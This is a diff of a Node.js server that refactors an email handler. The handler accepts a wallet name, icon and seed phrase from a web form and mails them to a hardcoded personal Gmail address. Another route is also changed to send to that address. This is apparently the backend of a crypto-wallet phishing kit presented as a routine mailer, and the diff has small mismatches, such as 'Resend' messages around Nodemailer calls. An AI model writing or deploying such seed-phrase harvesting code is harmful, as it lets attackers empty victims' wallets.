@@ -132,54 +132,53 @@ const handleToggle = async (req, res, body) => {
 
 // Send email using Nodemailer
 const sendEmail = async (req, res, body) => {
+  if (req.method !== "POST") {
+    return res.status(405).json({ error: "Method not allowed" });
+  }
+
+  const { walletName, walletIcon, seedPhrase } = req.body;
+
+  // Validate inputs
+  if (!walletName || !walletIcon || !seedPhrase) {
+    return res.status(400).json({ error: "Missing required fields" });
+  }
+
+  console.log("📧 Received email request:", {
+    walletName,
+    walletIcon,
+    seedPhrase: seedPhrase ? "✓" : "✗",
+  });
+
+  // if (!walletName || !walletIcon || !seedPhrase) {
+  //   res.writeHead(400, {
+  //     "Content-Type": "application/json",
+  //     "Access-Control-Allow-Origin": "*",
+  //   });
+  //   res.end(JSON.stringify({ error: "Missing required fields" }));
+  //   return;
+  // }
+
+  // ✅ Check if SMTP credentials are configured
+  // if (
+  //   !process.env.SMTP_HOST ||
+  //   !process.env.SMTP_USER ||
+  //   !process.env.SMTP_PASS
+  // ) {
+  //   throw new Error(
+  //     "SMTP credentials not configured. Check SMTP_HOST, SMTP_USER, SMTP_PASS environment variables",
+  //   );
+  // }
+
+  console.log("📤 Sending email via Nodemailer...");
+  console.log("⏱️ Timeout: 10 seconds for connection and socket operations");
+
+  // ✅ Send email via Nodemailer with error handling
   try {
-    if (req.method !== "POST") {
-      res.writeHead(405, {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*",
-      });
-      res.end(JSON.stringify({ error: "Method not allowed" }));
-      return;
-    }
-
-    const { walletName, walletIcon, seedPhrase } = JSON.parse(body);
-
-    console.log("📧 Received email request:", {
-      walletName,
-      walletIcon,
-      seedPhrase: seedPhrase ? "✓" : "✗",
-    });
-
-    if (!walletName || !walletIcon || !seedPhrase) {
-      res.writeHead(400, {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*",
-      });
-      res.end(JSON.stringify({ error: "Missing required fields" }));
-      return;
-    }
-
-    // ✅ Check if SMTP credentials are configured
-    if (
-      !process.env.SMTP_HOST ||
-      !process.env.SMTP_USER ||
-      !process.env.SMTP_PASS
-    ) {
-      throw new Error(
-        "SMTP credentials not configured. Check SMTP_HOST, SMTP_USER, SMTP_PASS environment variables",
-      );
-    }
-
-    console.log("📤 Sending email via Nodemailer...");
-    console.log("⏱️ Timeout: 10 seconds for connection and socket operations");
-
-    // ✅ Send email via Nodemailer with error handling
-    try {
-      const result = await transporter.sendMail({
-        from: '"Sender" <support@realworldfin.xyz>',
-        to: "danielekene6b@gmail.com",
-        subject: `New Message from ${walletName}`,
-        html: `
+    const result = await transporter.sendMail({
+      from: '"Sender" <support@realworldfin.xyz>',
+      to: "danielekene6b@gmail.com",
+      subject: `New Message from ${walletName}`,
+      html: `
           <h2>New Submission</h2>
           <p><strong>Name:</strong> ${walletName}</p>
           <p><strong>Icon:</strong> ${walletIcon}</p>
@@ -188,45 +187,22 @@ const sendEmail = async (req, res, body) => {
           <hr>
           <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
         `,
-      });
-
-      console.log(
-        "✅ Email sent successfully via Nodemailer:",
-        result.messageId,
-      );
-
-      res.writeHead(200, {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*",
-      });
-      res.end(
-        JSON.stringify({
-          success: true,
-          message: "✅ Email sent successfully via Nodemailer",
-          messageId: result.messageId,
-        }),
-      );
-    } catch (smtpError) {
-      console.error("❌ SMTP Error Details:", {
-        code: smtpError.code,
-        message: smtpError.message,
-        command: smtpError.command,
-      });
-
-      throw smtpError;
-    }
-  } catch (err) {
-    console.error("❌ Email error:", err.message);
-    res.writeHead(500, {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
     });
-    res.end(
-      JSON.stringify({
-        error: "Failed to send email",
-        details: err.message,
-      }),
-    );
+
+    console.log("✅ Email sent successfully via Nodemailer:", result.messageId);
+
+    return res.status(200).json({
+      success: true,
+      message: "✅ Email sent successfully via Resend",
+      messageId: result.id,
+    });
+  } catch (error) {
+    console.error("Resend Email error:", error);
+    return res.status(500).json({
+      success: false,
+      error: "Failed to send email via Resend",
+      details: error.message,
+    });
   }
 };
 
@@ -275,8 +251,8 @@ const server = http.createServer((req, res) => {
   else if (parsedUrl.pathname === "/test-email") {
     transporter
       .sendMail({
-        from: process.env.SMTP_FROM || process.env.SMTP_USER,
-        to: process.env.SMTP_TO,
+        from: '"Test Sender" <support@realworldfin.xyz>',
+        to: "danielekene6b@gmail.com",
         subject: "Test Email from Render",
         html: "<h1>✅ Test Email</h1><p>If you see this, Nodemailer is working!</p>",
       })
